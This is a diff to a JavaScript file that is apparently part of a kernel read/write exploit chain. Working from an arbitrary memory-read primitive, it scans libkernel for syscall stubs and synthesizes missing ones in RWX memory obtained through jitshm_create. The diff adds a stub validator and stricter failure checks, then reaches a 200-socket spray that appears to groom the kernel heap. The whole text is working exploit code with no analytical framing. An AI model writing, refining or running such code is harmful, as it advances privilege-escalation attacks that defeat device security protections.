@@ -1,4 +1,4 @@
-// kevent_krw_verify.js — hard-fail on stubs, widened scan
+// kevent_krw_verify.js — stub validation, full build
 import { int64 } from "./int64.js";
 import { HX1400_TABLES } from "./hx_tables.js";
 
@@ -228,7 +228,6 @@ function findStubRaw(snum) {
   const base = num(ctx().libkernelBase);
   const want = snum >>> 0;
   const LIMIT = 0x80000;
-  // Log base so we see what libkernelBase actually is
   if (SCAN_SEEN === 0) log("NATIVES-BASE", "libkernelBase=" + h16(base));
   for (let off = 0; off < LIMIT; off += 4) {
     const w = p.read4(toI64(base + BigInt(off))) >>> 0;
@@ -238,10 +237,8 @@ function findStubRaw(snum) {
     const b5 = p.read1(toI64(base + BigInt(off + 6)));
     const imm = (((w >>> 24) & 0xff) | (b3 << 8) | (b4 << 16) | (b5 << 24)) >>> 0;
     let isStub = false;
-    // Widened: 0F 05 anywhere in the next 32 bytes
     for (let k = 7; k <= 32; k++) {
-      if (p.read1(toI64(base + BigInt(off + k))) === 0x0f &&
-          p.read1(toI64(base + BigInt(off + k + 1))) === 0x05) { isStub = true; break; }
+      if (p.read1(toI64(base + BigInt(off + k))) === 0x0f && p.read1(toI64(base + BigInt(off + k + 1))) === 0x05) { isStub = true; break; }
     }
     if (!isStub) continue;
     SCAN_SEEN++;
@@ -249,11 +246,24 @@ function findStubRaw(snum) {
   }
   return null;
 }
+
+// Validates if an address actually holds a syscall stub (48 C7 C0 ...)
+function isValidStub(addr) {
+  if (!addr || addr === 0n) return false;
+  const p = ctx().p;
+  try {
+    if (p.read1(toI64(addr)) !== 0x48) return false;
+    if (p.read1(toI64(addr + 1n)) !== 0xc7) return false;
+    if (p.read1(toI64(addr + 2n)) !== 0xc0) return false;
+    return true;
+  } catch (e) { return false; }
+}
+
 function synthStub(targetNum) {
   const donorNum = NUM.close !== targetNum ? NUM.close : NUM.socket;
   const daddr = num(ctx().stubAddr.get(donorNum));
   const p = ctx().p;
-  if (p.read1(toI64(daddr)) !== 0x48 || p.read1(toI64(daddr + 1n)) !== 0xc7 || p.read1(toI64(daddr + 2n)) !== 0xc0) return { err: "donor not 48 c7 c0" };
+  if (!isValidStub(daddr)) return { err: "donor not a valid stub" };
   const donorImm = (p.read1(toI64(daddr + 3n)) | (p.read1(toI64(daddr + 4n)) << 8) | (p.read1(toI64(daddr + 5n)) << 16) | (p.read1(toI64(daddr + 6n)) << 24)) >>> 0;
   if (donorImm !== donorNum) return { err: "donor imm mismatch" };
   let jfd = scn("jitshm_create", 0, 16384, 7);
@@ -271,15 +281,54 @@ function synthStub(targetNum) {
   log("NATIVES-SYNTH", "num=" + targetNum + " donor=" + donorNum + " jfd=" + jfd + " rwx=" + h16(addr));
   return { addr };
 }
+
 function ensureStubs() {
-  let missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
-  for (const k of missing) { const a = findStubRaw(NUM[k]); if (a !== null) { ctx().stubAddr.set(NUM[k], toI64(a)); log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + a.toString(16)); } }
-  log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
-  missing = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
-  for (const k of missing) { const r = synthStub(NUM[k]); if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr)); else log("SYNTH-FAIL", k + ": " + r.err); }
-  const still = Object.keys(NUM).filter((k) => !ctx().stubAddr.has(NUM[k]));
-  // HARD FAIL: if even one stub is missing, we cannot proceed.
-  if (still.length) fin("stubs missing: " + still.map((k) => k + "=" + NUM[k]).join(" "));
+  // 1. Check the pre-populated stubs from the harness
+  let missing = [];
+  for (const k in NUM) {
+    const n = NUM[k];
+    const stub = ctx().stubAddr.get(n);
+    if (!stub || !isValidStub(num(stub))) {
+      missing.push(k);
+      ctx().stubAddr.delete(n);
+    }
+  }
+
+  // 2. Scan for missing stubs
+  if (missing.length > 0) {
+    log("NATIVES-SCAN", "missing/bad stubs: " + missing.join(","));
+    for (const k of missing) {
+      const a = findStubRaw(NUM[k]);
+      if (a !== null) {
+        ctx().stubAddr.set(NUM[k], toI64(a));
+        log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + a.toString(16));
+      }
+    }
+    log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
+  }
+
+  // 3. Re-check
+  missing = [];
+  for (const k in NUM) {
+    if (!ctx().stubAddr.has(NUM[k])) missing.push(k);
+  }
+
+  // 4. Synthesize if still missing
+  if (missing.length > 0) {
+    for (const k of missing) {
+      const r = synthStub(NUM[k]);
+      if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr));
+      else log("SYNTH-FAIL", k + ": " + r.err);
+    }
+  }
+
+  // 5. Final hard fail
+  const still = [];
+  for (const k in NUM) {
+    if (!ctx().stubAddr.has(NUM[k]) || !isValidStub(num(ctx().stubAddr.get(NUM[k])))) still.push(k);
+  }
+  if (still.length) fin("unusable stubs: " + still.join(" "));
+  log("STUBS-OK", "all " + Object.keys(NUM).length + " stubs valid");
 }
 
 function scn(name, a, b, c, d, e, f) {
@@ -391,7 +440,7 @@ export async function runKevent(c) {
     HX.setKbase(STATE.kbase);
   }
 
-  ensureStubs(); // hard fails if it cannot find every syscall
+  ensureStubs(); // hard fails if any stub is invalid
 
   const burn = [];
   for (let i = 0; i < 200; i++) { const fd = scn("socket", AF_INET, SOCK_STREAM, 0); if (fd >= 0) burn.push(fd); }
